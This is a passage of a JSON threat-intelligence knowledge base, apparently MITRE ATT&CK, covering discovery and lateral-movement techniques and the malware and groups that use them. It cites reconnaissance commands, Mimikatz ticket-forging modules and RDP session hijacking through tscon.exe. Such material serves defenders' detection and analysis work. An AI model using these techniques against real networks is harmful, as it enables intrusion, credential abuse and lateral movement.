                    "Description": "Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.[35]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.[36][37]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address.[38]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.[39]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type may create a file containing the results of the command cmd.exe /c ipconfig /all.[40]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind obtains the victim IP address.[41]"
                },
                {
                    "Name": "More_eggs",
                    "Description": "More_eggs has the capability to gather the IP address from the victim's machine.[42]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito uses the ipconfig command.[43]"
                },
                {
                    "Name": "Naid",
                    "Description": "Naid collects the domain name from a compromised host.[44]"
                },
                {
                    "Name": "Naikon",
                    "Description": "Naikon uses commands such as netsh interface show to discover network interface settings.[45]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu can gather information about the victim proxy server.[46]"
                },
                {
                    "Name": "nbtstat",
                    "Description": "nbtstat can be used to discover local NetBIOS domain names."
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has run ipconfig /all on a victim.[47][48]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz can gather victim proxy information.[46]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo discovers the current domain information.[4]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader has a command to collect the victim's IP address.[49]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE uses the ipconfig /all command to gather the victim’s IP address.[50]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has a command to get the victim's domain and NetBIOS name.[51]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can retrieve IP and network adapter configuration information from compromised hosts.[52]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect network configuration data by running ipconfig /all on a victim.[53]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka collects information from the victim about its IP addresses and MAC addresses.[54]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc collects the network adapter information and domain/username information based on current remote sessions.[55]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.[56]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT gathers the current domain the victim system belongs to.[57]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA gathers the victim’s IP address via the ipconfig -all command.[58][59]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver collects the victim's IP address.[60]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can obtain information about network parameters.[39]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.[61]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin gathers the IP address and domain from the victim’s machine.[62]"
                },
                {
                    "Name": "route",
                    "Description": "route can be used to discover routing configuration information."
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon obtains the target's IP address and local network segment.[63]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim.[64]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot may use ipconfig /all to gather system network configuration details.[65]"
                },
                {
                    "Name": "Sys10",
                    "Description": "Sys10 collects the local IP address of the victim and sends it to the C2.[45]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 gathers and beacons the MAC and IP addresses during installation.[66]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors use nbtscan to discover vulnerable systems.[67]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot obtains the IP address from the victim’s machine.[68]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, and net config commands.[69]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger can obtain information about the victim's IP address.[70]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT has the capability to gather the victim's proxy information.[71]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN gathers the local IP address.[72]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can gather the IP address from the victim's machine.[73]"
                },
                {
                    "Name": "yty",
                    "Description": "yty runs ipconfig /all and collects the domain name.[74]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT gathers the victim's IP address and domain information, and then sends it to its C2 server.[75]"
                }
            ]
        },
        "System Network Connections Discovery": {
            "Name": "System Network Connections Discovery",
            "Description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. WindowsUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net.Mac and LinuxIn Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\".\n",
            "ID": "T1049",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: netstat -ano >> %temp%\\download[1]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can enumerate current network connections.[2][3][4]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has gathered information about local network connections using netstat.[5][6]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie executes the netstat -ano command.[7]"
                },
                {
                    "Name": "Duqu",
                    "Description": "The discovery modules used with Duqu can collect information on network connections.[8]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT uses the netstat command to find open ports on the victim’s machine.[9]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang performs local network connection discovery using netstat.[10][11]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects a list of active and listening connections by using the command netstat -nao as well as a list of available network mappings with net use.[12]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used net use to conduct connectivity checks to machines.[13]"
                },
                {
                    "Name": "nbtstat",
                    "Description": "nbtstat can be used to discover current NetBIOS sessions."
                },
                {
                    "Name": "Net",
                    "Description": "Commands such as net use and net session can be used in Net to gather information about network connections from a particular host.[14]"
                },
                {
                    "Name": "netstat",
                    "Description": "netstat can be used to enumerate local network connections, including active TCP connections and other network statistics.[15]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used netstat -an on a victim to get a listing of network connections.[16]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo enumerates the current network connections similar to  net use .[2]"
                },
                {
                    "Name": "Poseidon Group",
                    "Description": "Poseidon Group obtains and saves information about victim network interfaces and addresses.[17]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect active network connections by running netstat -an on a victim.[18]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy has a built-in utility command for netstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.[19]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses netstat -ano to search for specific IP address ranges.[20]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can enumerate drives and Remote Desktop sessions.[21]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can obtain a list of active connections and open ports.[22]"
                },
                {
                    "Name": "SHOTPUT",
                    "Description": "SHOTPUT uses netstat to list TCP connection status.[23]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot may use netstat -ano to display active network connections.[24]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used net use to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.[25]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.[26]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can gather information about TCP connection state.[27]"
                }
            ]
        },
        "System Owner/User Discovery": {
            "Name": "System Owner/User Discovery",
            "Description": "WindowsAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.MacOn Mac, the currently logged in user can be identified with users,w, and who.LinuxOn Linux, the currently logged in user can be identified with w and who.\n",
            "ID": "T1033",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-577",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Agent.btz",
                    "Description": "Agent.btz obtains the victim username and saves it to a file.[1]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.[2]"
                },
                {
                    "Name": "APT3",
                    "Description": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of \"System.\"[3]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 collects the victim's username.[4]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 identifies the victim username.[5]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea collects the current username from the victim.[6]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. Derusbi also gathers the username of the victim.[7]"
                },
                {
                    "Name": "DownPaper",
                    "Description": "DownPaper collects the victim username and sends it to the C2 server.[8]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used the command query user on victim hosts.[9]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus collects the current username and sends it to the C2 server.[10]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT collects the username from the victim’s machine.[11]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has used Meterpreter to enumerate users on remote systems.[12]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "A Gamaredon Group file stealer can gather the victim's username to send to a C2 server.[13]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer obtains the current user's security identifier.[14]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.[15]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT collects the victim username along with other account information (account type, description, full name, SID and status).[16]"
                },
                {
                    "Name": "HAPPYWORK",
                    "Description": "can collect the victim user name.[17]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole lists local users and session information.[18]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can obtain the victim user name.[19]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar gathers information on users.[20]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can identify logged in users across the domain and views user sessions.[21]"
                },
                {
                    "Name": "Komplex",
                    "Description": "The OsInfo function in Komplex collects the current running username.[22]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects registered owner details by using the commands systeminfo and net config workstation.[23]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Various Lazarus Group malware enumerates logged-on users.[24][25][26][27][28]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has obtained the victim username and sent it to the C2 server.[29]"
                },
                {
                    "Name": "MirageFox",
                    "Description": "MirageFox can gather the username from the victim’s machine.[30]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type runs tests to determine the privilege level of the compromised user.[31]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind obtains the victim username.[32]"
                },
                {
                    "Name": "More_eggs",
                    "Description": "More_eggs has the capability to gather the username from the victim's machine.[33]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito runs whoami on the victim’s machine.[34]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu collects the username from the victim.[35]"
                },
                {
                    "Name": "NDiskMonitor",
                    "Description": "NDiskMonitor obtains the victim username and encrypts the information to send over its C2 channel.[36]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has run whoami on a victim.[37][38]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server.[39][36]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has commands to get the current user's name and SID.[40]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect information about the currently logged in user by running whoami on a victim.[41]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka collects information from the victim about the current user name.[42]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.[43]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT gathers the victim username.[44]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA runs the whoami and query user commands.[45]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver collects the victim's username.[46]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can obtain information about the logged on user both locally and for Remote Desktop sessions.[47]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can obtain information about the current user.[48]"
                },
                {
                    "Name": "RGDoor",
                    "Description": "RGDoor executes the whoami on the victim’s machine.[49]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin collects the victim’s username and whether that user is an admin.[50]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can obtain the victim username and permissions.[51]"
                },
                {
                    "Name": "SslMM",
                    "Description": "SslMM sends the logged-on username to its hard-coded C2.[52]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware gathers the registered user and primary owner name via WMI.[53]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck gathers user names from infected hosts.[54]"
                },
                {
                    "Name": "Sys10",
                    "Description": "Sys10 collects the account name of the logged-in user and sends it to the C2.[52]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.[55]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger can obtain information about the victim usernames.[56]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT has the capability to collect the current logged on user’s username from a machine.[57]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN gathers the username from the victim’s machine.[58]"
                },
                {
                    "Name": "WINDSHIELD",
                    "Description": "WINDSHIELD can gather the victim user name.[59]"
                },
                {
                    "Name": "WINERACK",
                    "Description": "WINERACK can gather information on the victim username.[17]"
                },
                {
                    "Name": "WinMM",
                    "Description": "WinMM uses NetUser-GetInfo to identify that it is running under an \"Admin\" account on the local system.[52]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the getInfoOSX function to return the OS X version as well as the current user.[60]"
                },
                {
                    "Name": "yty",
                    "Description": "yty collects the victim’s username.[61]"
                }
            ]
        },
        "System Service Discovery": {
            "Name": "System Service Discovery",
            "Description": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using Tasklist, and \"net start\" using Net, but adversaries may also use other tools as well.\n",
            "ID": "T1007",
            "Tactic": "Discovery",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-574",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: net start >> %temp%\\download[1]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT can query service configuration information.[2]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie runs the command: net start >> %TEMP%\\info.dat on a victim.[3]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise executes net start after initial communication is made to the remote server.[4]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary has the capability to execute the command net start to interact with services.[5]"
                },
                {
                    "Name": "GeminiDuke",
                    "Description": "GeminiDuke collects information on programs and services on the victim that are configured to automatically run at startup.[6]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT has a feature to list the available services on the system.[7]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can monitor services.[8][9]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can obtain running services on the victim.[10]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can list running services.[11]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang performs service discovery using net start commands.[12]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects a list of running services with the command tasklist /svc.[13]"
                },
                {
                    "Name": "Net",
                    "Description": "The net start command can be used in Net to find information about Windows services.[14]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used sc query on a victim to gather information about services.[15]"
                },
                {
                    "Name": "Poseidon Group",
                    "Description": "After compromising a victim, Poseidon Group discovers all running services.[16]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses tasklist /svc to display running tasks.[17]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type runs the command net start on a victim.[18]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot may use net start to display running services.[19]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck enumerates all running services.[20][21]"
                },
                {
                    "Name": "Tasklist",
                    "Description": "Tasklist can be used to discover services running on a system.[22]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot collects a list of install programs and services on the system’s machine.[23]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.[24]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer queries the system to identify existing services.[25]"
                },
                {
                    "Name": "WINERACK",
                    "Description": "WINERACK can enumerate services.[26]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib has the ability to discover and manipulate Windows services.[18]"
                }
            ]
        },
        "System Time Discovery": {
            "Name": "System Time Discovery",
            "Description": "The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. [1] [2]An adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. [2] The information could be useful for performing other techniques, such as executing a file with a Scheduled Task [3], or to discover locality information based on time zone to assist in victim targeting.\n",
            "ID": "T1124",
            "Tactic": "Discovery",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters, API monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used net time to check the local time on a target system.[4]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT can obtain the date and time of a system.[5]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole gathers the local system time from the victim’s machine.[6]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server.[7]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind obtains the victim's current time.[8]"
                },
                {
                    "Name": "Net",
                    "Description": "The net time command can be used in Net to determine the local or remote system time.[9]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.[10]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has commands to get the time the machine was built, the time, and the time zone.[11]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server.[7]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can obtain the victim time zone.[12]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon obtains the system time and will only activate if it is greater than a preset date.[13]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 gathers and beacons the system time during installation.[14]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla surveys a system upon check-in to discover the system time by using the net time command.[15]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT has the capability to obtain the time zone information and current timestamp of the victim’s machine.[16]"
                }
            ]
        },
        "Application Deployment Software": {
            "Name": "Application Deployment Software",
            "Description": "Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n",
            "ID": "T1017",
            "Tactic": "Lateral Movement",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process use of network, Process monitoring",
            "CAPEC ID: ": "CAPEC-187",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT32",
                    "Description": "APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.[1]"
                }
            ]
        },
        "Distributed Component Object Model": {
            "Name": "Distributed Component Object Model",
            "Description": "Windows Distributed Component Object Model (DCOM) is transparent middleware that extends the functionality of Component Object Model (COM) [1] beyond a local computer using remote procedure call (RPC) technology. COM is a component of the Windows application programming interface (API) that enables interaction between software objects. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. [2] [3] [4] By default, only Administrators may remotely activate and launch COM objects through DCOM.Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications [5] as well as other Windows objects that contain insecure methods. [6] [7] DCOM can also execute macros in existing documents [8] and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application [9], bypassing the need for a malicious document.DCOM may also expose functionalities that can be leveraged during other areas of the adversary chain of activity such as Privilege Escalation and Persistence. [10]\n",
            "ID": "T1175",
            "Tactic": "Lateral Movement",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Authentication logs, DLL monitoring, Packet capture, Process monitoring, Windows Registry, Windows event logs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can deliver \"beacon\" payloads for lateral movement by leveraging remote COM execution.[11]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.[12]"
                }
            ]
        },
        "Exploitation of Remote Services": {
            "Name": "Exploitation of Remote Services",
            "Description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB [1] and RDP [2] as well as applications that may be used within internal networks such as MySQL [3] and web server services. [4]Depending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\n",
            "ID": "T1210",
            "Tactic": "Lateral Movement",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Windows Error Reporting, Process monitoring, File monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.[5][6][7]"
                },
                {
                    "Name": "Flame",
                    "Description": "Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.[8][9]"
                }
            ]
        },
        "Pass the Hash": {
            "Name": "Pass the Hash",
            "Description": "Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. [1]\n",
            "ID": "T1075",
            "Tactic": "Lateral Movement",
            "Platform: ": "Windows",
            "Data Sources: ": "Authentication logs",
            "Contributors: ": "Travis Smith, Tripwire",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "The APT1 group is known to have used pass the hash.[2]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has used pass the hash for lateral movement.[3]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 used Kerberos ticket attacks for lateral movement.[4]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can perform pass the hash.[5]"
                },
                {
                    "Name": "Mimikatz",
                    "Description": "Mimikatz's SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands.[6]"
                },
                {
                    "Name": "Pass-The-Hash Toolkit",
                    "Description": "Pass-The-Hash Toolkit can perform pass the hash.[2]"
                }
            ]
        },
        "Pass the Ticket": {
            "Name": "Pass the Ticket",
            "Description": "Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.In this technique, valid Kerberos tickets for Valid Accounts are captured by Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. [1] [2]Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). [1]Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. [3]\n",
            "ID": "T1097",
            "Tactic": "Lateral Movement",
            "Platform: ": "Windows",
            "Data Sources: ": "Authentication logs",
            "Contributors: ": "Ryan Becwar; Vincent Le Toux",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.[4]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang has used Mimikatz to generate Kerberos golden tickets.[5]"
                },
                {
                    "Name": "Mimikatz",
                    "Description": "Mimikatz’s LSADUMP::DCSync, KERBEROS::Golden, and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.[6][7][8]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication.[9]"
                }
            ]
        },
        "Remote Desktop Protocol": {
            "Name": "Remote Desktop Protocol",
            "Description": "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). [1] There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS.Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence. [2]Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. [3] This can be done remotely or locally and with active or disconnected sessions. [4] It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. [5]\n",
            "ID": "T1076",
            "Tactic": "Lateral Movement",
            "Platform: ": "Windows",
            "Permissions Required: ": "Remote Desktop Users, User",
            "Data Sources: ": "Authentication logs, Netflow/Enclave netflow, Process monitoring",
            "CAPEC ID: ": "CAPEC-555",
            "Contributors: ": "Matthew Demaske, Adaptforward",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "The APT1 group is known to have used RDP during operations.[6]"
                },
